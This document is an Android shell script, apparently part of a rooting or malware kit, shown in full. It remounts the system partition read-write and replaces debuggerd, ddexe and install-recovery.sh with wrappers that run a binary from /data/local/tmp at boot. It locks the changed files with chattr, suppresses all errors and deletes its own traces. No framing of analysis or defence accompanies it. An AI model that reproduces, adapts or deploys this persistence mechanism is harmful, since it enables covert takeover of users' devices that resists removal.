#!/system/bin/sh

ch_con() {
  LD_LIBRARY_PATH=$SYSTEMLIB /system/bin/toybox chcon -h u:object_r:system_file:s0 $1 1>/dev/null 2>/dev/null
  LD_LIBRARY_PATH=$SYSTEMLIB /system/bin/toolbox chcon -h u:object_r:system_file:s0 $1 1>/dev/null 2>/dev/null
  chcon -h u:object_r:system_file:s0 $1 1>/dev/null 2>/dev/null
  LD_LIBRARY_PATH=$SYSTEMLIB /system/bin/toybox chcon u:object_r:system_file:s0 $1 1>/dev/null 2>/dev/null
  LD_LIBRARY_PATH=$SYSTEMLIB /system/bin/toolbox chcon u:object_r:system_file:s0 $1 1>/dev/null 2>/dev/null
  chcon u:object_r:system_file:s0 $1 1>/dev/null 2>/dev/null
}

ch_con_ext() {
  LD_LIBRARY_PATH=$SYSTEMLIB /system/bin/toybox chcon $2 $1 1>/dev/null 2>/dev/null
  LD_LIBRARY_PATH=$SYSTEMLIB /system/bin/toolbox chcon $2 $1 1>/dev/null 2>/dev/null
  chcon $2 $1 1>/dev/null 2>/dev/null
}

ln_con() {
  LD_LIBRARY_PATH=$SYSTEMLIB /system/bin/toybox ln -s $1 $2 1>/dev/null 2>/dev/null
  LD_LIBRARY_PATH=$SYSTEMLIB /system/bin/toolbox ln -s $1 $2 1>/dev/null 2>/dev/null
  ln -s $1 $2 1>/dev/null 2>/dev/null
  ch_con $2 1>/dev/null 2>/dev/null
}

set_perm() {
  chown $1.$2 $4 1>/dev/null 2>/dev/null
  chown $1:$2 $4 1>/dev/null 2>/dev/null
  chmod $3 $4 1>/dev/null 2>/dev/null
  ch_con $4
  ch_con_ext $4 $5
}

cp_perm() {
  rm $5 1>/dev/null 2>/dev/null
  if [ -f "$4" ]; then
    cat $4 > $5
    set_perm $1 $2 $3 $5 $6
  fi
}

rm_file_attr() {
  chattr -ia $1 1>/dev/null 2>/dev/null
}

add_file_attr() {
  chattr +ia $1 1>/dev/null 2>/dev/null
}

clear_badguys() {
  rm -rf $CUR_PATH/1.bin
  rm -rf $CUR_PATH/7.bin
  rm -rf $CUR_PATH/ak.bin
  rm -rf $CUR_PATH/ip.dat
  rm -rf $CUR_PATH/Test.apk
  pm uninstall com.example.test
}

clear_ourselfs() {
  rm -rf $INVOKE_FILE
  rm -rf $CUR_PATH/ddexe
  rm -rf $CUR_PATH/debuggerd
  rm -rf $CUR_PATH/install-recovery.sh
}


create_install_recovery() {
    echo '#!/system/bin/sh' > $CUR_PATH/install-recovery.sh
    echo 'if [ -f /data/local/tmp/trinity ]; then /data/local/tmp/trinity; fi' >> $CUR_PATH/install-recovery.sh
    echo '/system/etc/install-recovery-2.sh' >> $CUR_PATH/install-recovery.sh
}

create_ddexe() {
    echo '#!/system/bin/sh' > $CUR_PATH/ddexe
    echo 'if [ -f /data/local/tmp/trinity ]; then /data/local/tmp/trinity; fi' >> $CUR_PATH/ddexe
    echo '/system/bin/ddexe_real' >> $CUR_PATH/ddexe
}

create_debuggerd() {
    echo '#!/system/bin/sh' > $CUR_PATH/debuggerd
    echo 'if [ -f /data/local/tmp/trinity ]; then /data/local/tmp/trinity; fi' >> $CUR_PATH/debuggerd
    echo '/system/bin/debuggerd_real' >> $CUR_PATH/debuggerd
    echo '/system/bin/debuggerd64_real' >> $CUR_PATH/debuggerd
}


CUR_PATH=/data/local/tmp
INVOKE_FILE=$CUR_PATH/rtsh.sh
ALREADY=false

clear_badguys

create_ddexe
create_debuggerd
create_install_recovery

if [ -f /system/etc/install-recovery.sh ]; then
  ALREADY=true
fi
if [ -f /system/bin/debuggerd64_real ]; then
  ALREADY=true
fi
if [ -f /system/bin/debuggerd_real ]; then
  ALREADY=true
fi
if [ -f /system/bin/ddexe_real ]; then
  ALREADY=true
fi

mount -o rw,remount /data
mount -o rw,remount /system
mount -o rw,remount /data /data
mount -o rw,remount /
mount -o rw,remount / /

if ($ALREADY); then
  if [ -f /system/etc/install-recovery.sh ]; then
    rm_file_attr /system/bin/install-recovery.sh
    rm /system/bin/install-recovery.sh
    cp_perm 0 0 0755 $CUR_PATH/install-recovery.sh /system/bin/install-recovery.sh
  fi
  if [ -f /system/bin/ddexe_real ]; then
    rm_file_attr /system/bin/ddexe
    rm /system/bin/ddexe
    cp_perm 0 2000 0755 $CUR_PATH/ddexe /system/bin/ddexe
  fi
  if [ -f /system/bin/debuggerd_real ]; then
    rm_file_attr /system/bin/debuggerd
    rm /system/bin/debuggerd
    cp_perm 0 2000 0755 $CUR_PATH/debuggerd /system/bin/debuggerd
  fi
  if [ -f /system/bin/debuggerd64_real ]; then
    rm_file_attr /system/bin/debuggerd64
    rm /system/bin/debuggerd64
    cp_perm 0 2000 0755 $CUR_PATH/debuggerd /system/bin/debuggerd64
  fi
else
  if [ -f /system/bin/install-recovery.sh ]; then
    rm /system/bin/install-recovery.sh
    cp_perm 0 0 0755 $CUR_PATH/install-recovery.sh /system/etc/install-recovery.sh
    ln_con /system/etc/install-recovery.sh /system/bin/install-recovery.sh
    add_file_attr /system/etc/install-recovery.sh
  fi
  if [ -f /system/bin/ddexe ]; then
    cp_perm 0 2000 0755 /system/bin/ddexe /system/bin/ddexe_real
    ch_con /system/bin/ddexe_real
    rm_file_attr /system/bin/ddexe
    rm /system/bin/ddexe
    cp_perm 0 2000 0755 $CUR_PATH/ddexe /system/bin/ddexe
    ch_con /system/bin/ddexe
  fi
  if [ -f /system/bin/debuggerd ]; then
    cp_perm 0 2000 0755 /system/bin/debuggerd /system/bin/debuggerd_real
    ch_con /system/bin/debuggerd_real
    rm_file_attr /system/bin/debuggerd
    rm /system/bin/debuggerd
    cp_perm 0 2000 0755 $CUR_PATH/debuggerd /system/bin/debuggerd
    ch_con /system/bin/debuggerd
  fi
  if [ -f /system/bin/debuggerd64 ]; then
    cp_perm 0 2000 0755 /system/bin/debuggerd64 /system/bin/debuggerd64_real
    ch_con /system/bin/debuggerd64_real
    rm_file_attr /system/bin/debuggerd64
    rm /system/bin/debuggerd64
    cp_perm 0 2000 0755 $CUR_PATH/debuggerd /system/bin/debuggerd64
    ch_con /system/bin/debuggerd64
  fi
fi

echo botbotbot > $CUR_PATH/botsuinit_1_1.txt
chmod 0755 $CUR_PATH/botsuinit_1_1.txt
clear_ourselfs
sync